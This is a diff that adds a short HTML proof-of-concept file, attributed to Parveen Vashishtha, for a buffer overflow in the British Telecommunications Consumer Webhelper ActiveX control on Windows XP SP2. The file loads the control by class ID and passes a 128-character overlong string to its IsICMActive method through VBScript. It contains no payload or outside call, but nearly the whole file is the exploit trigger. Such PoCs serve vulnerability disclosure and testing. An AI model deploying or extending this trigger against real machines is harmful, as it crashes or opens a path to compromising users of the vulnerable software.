@@ -1,0 +1,21 @@
+&lt;!--
+
+British Telecommunications Consumer Webhelper Multiple Buffer Overflow POC
+By Parveen Vashishtha
+
+Desc:
+This is just POC.
+
+Tested on Windows XP SP2 English fully patched.
+
+--&gt;
+
+&lt;html&gt;
+&lt;object classid=&#039;clsid:EC5A4E7B-02EB-451D-B310-D5F2E0A4D8C3&#039; id=&#039;bt&#039;&gt;&lt;/object&gt;
+&lt;script language=&#039;vbscript&#039;&gt;
+
+var=String(128, &quot;A&quot;)
+
+bt.IsICMActive var 
+
+&lt;/script&gt;&lt;/html&gt;
